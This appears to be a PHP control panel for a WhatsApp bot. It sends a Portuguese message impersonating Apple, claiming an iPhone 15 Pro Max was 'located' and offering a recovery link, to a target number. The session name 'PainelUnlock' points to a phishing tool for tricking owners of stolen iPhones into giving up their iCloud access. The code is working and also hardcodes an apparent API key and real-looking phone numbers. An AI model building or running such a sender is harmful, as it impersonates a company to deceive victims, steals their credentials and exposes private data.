<?php
/**
 * # WhatsApp Pro API Specification v2.0
 * 
 * ## 1. Authentication
 * - Method: Bearer Token
 * - Header: Authorization: Bearer <API_KEY>
 * 
 * ## 3. Bot Standard Message (Template)
 * Example Payload:
 * {
 *   "session": "thiago",
 *   "number": "5541995810993",
 *   "message": "*Dispositivo Localizado*...",
 *   "mediaPath": "C:/path/to/apple_logo.png",
 *   "trackLink": "https://link-de-recuperacao.com",
 *   "language": "pt"
 * }
 */

// 1. CONFIGURAÇÕES (Preencha com seus dados)
require_once 'config.php';
$api_url = BOT_API_URL;
$api_key = "botzp_75ee8182fd0c60022f3f25f665806c27"; // Sua API Key válida (ID 2Admin)
$target_number = "554195457772"; // Número de destino
$session_id = "PainelUnlock"; // Nome da instância conectada
$trackLink = "https://icloud.com"; // O Link que o bot vai enviar
$idioma = "pt"; // Idioma do contato (en, es, zh, fr, ar, ru, sv)

// Lógica de Controle via AJAX (Botão)
if (isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    $isPaused = ($_POST['ajax_action'] === 'pause');
    
    $ch = curl_init($api_url . '/toggle-pause');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['number' => $target_number, 'pause' => $isPaused]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $res = curl_exec($ch);
    curl_close($ch);
    echo $res;
    exit;
}

// 2. DETALHES DO DISPOSITIVO
$iphone_modelo = "iPhone 15 Pro Max";
$iphone_cor = "Titânio Natural";
$iphone_capacidade = "512 GB";

// --- INICIO DO HTML ---
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Teste de API Pro + Controle</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #0f172a; color: #f1f5f9; padding: 40px; font-family: 'Inter', sans-serif; }
        .console-card { background: rgba(30, 41, 59, 0.7); border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); padding: 30px; margin-bottom: 20px; }
        .log-box { background: #000; color: #22c55e; padding: 20px; border-radius: 12px; font-family: monospace; font-size: 0.9rem; max-height: 400px; overflow-y: auto; }
        .btn-control { padding: 12px 25px; border-radius: 12px; font-weight: 700; border: none; transition: 0.3s; }
        .btn-pause { background: #f59e0b; color: #000; }
        .btn-play { background: #22c55e; color: #fff; }
        .btn-control:hover { transform: scale(1.05); filter: brightness(1.1); }
    </style>
</head>
<body>

<div class="container">
    <div class="console-card text-center">
        <h3 class="mb-4">🕹️ Controle de Atendimento (API Pro)</h3>
        <p class="text-muted">Número Alvo: <strong><?php echo $target_number; ?></strong></p>
        
        <div class="d-flex justify-content-center gap-3 mb-4">
            <button onclick="handlePause('pause')" class="btn-control btn-pause">
                <i class="fas fa-pause me-2"></i> Pausar Robô
            </button>
            <button onclick="handlePause('play')" class="btn-control btn-play">
                <i class="fas fa-play me-2"></i> Ativar Robô
            </button>
        </div>
        <div id="pause-feedback" class="small d-none p-2 rounded"></div>
    </div>

    <div class="console-card">
        <h5 class="mb-3"><i class="fas fa-terminal me-2 text-info"></i> Log de Disparo de Teste</h5>
        <div class="log-box">
<?php
// FUNÇÃO AUXILIAR PARA REQUISIÇÕES
function apiRequest($method, $endpoint, $data = null, $apiKey = '') {
    global $api_url;
    $ch = curl_init($api_url . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    $headers = ['Content-Type: application/json'];
    if ($apiKey) $headers[] = 'Authorization: Bearer ' . $apiKey;
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($data) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['code' => $httpCode, 'body' => json_decode($response, true)];
}

echo "> Iniciando Teste da API Pro (Modo Dinâmico: {$iphone_modelo})\n";

// ETAPA 1: LISTAR SESSÕES
echo "> 1. Listando sessões...\n";
$res = apiRequest('GET', '/api/sessions', null, $api_key);
if ($res['code'] === 200) {
    echo "  SUCESSO! " . count($res['body']) . " sessões encontradas.\n";
} else {
    echo "  ERRO: Código {$res['code']}\n";
    exit;
}

// ETAPA 3: ENVIAR MENSAGEM
echo "> 3. Enviando template Apple para {$target_number}...\n";
$vars = ['{modelo}' => $iphone_modelo, '{cor}' => $iphone_cor, '{capacidade}' => $iphone_capacidade, '{numero}' => $target_number];
$template = "*Dispositivo Localizado*\n" .
            "> Dispositivo: *{modelo} {cor} {capacidade}*\n" .
            "> Número de emergencia: *({numero})*\n" .
            "> ID de caso: *000-A946*\n" .
            "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
            "> *Copyright ©️ 2025 Apple Inc*\n" .
            "> | Apple ID | Support | Privacy Policy";
            
$finalMessage = strtr($template, $vars);

$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
$baseUrl = $protocol . "://" . $_SERVER['HTTP_HOST'];
$publicMediaPath = $baseUrl . '/uploads/Dynamic.png';

$payload = [
    'session' => $session_id,
    'number' => $target_number,
    'message' => $finalMessage,
    'mediaPath' => $publicMediaPath,
    'trackLink' => $trackLink,
    'language' => $idioma
];

$resSend = apiRequest('POST', '/api/send', $payload, $api_key);
if ($resSend['code'] === 200) {
    echo "  MENSAGEM ENVIADA COM SUCESSO! ✅\n";
} else {
    echo "  FALHA AO ENVIAR: " . json_encode($resSend['body']) . "\n";
}
?>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
function handlePause(act) {
    const feedback = $('#pause-feedback');
    feedback.removeClass('d-none bg-success bg-danger').addClass('bg-info').text('Processando...');
    
    $.post('', { ajax_action: act }, function(r) {
        feedback.removeClass('bg-info').addClass('bg-success').text('Sucesso: Robô ' + (act === 'pause' ? 'Pausado' : 'Ativado'));
    }).fail(function() {
        feedback.removeClass('bg-info').addClass('bg-danger').text('Erro ao comunicar com o servidor.');
    });
}
</script>
</body>
</html>
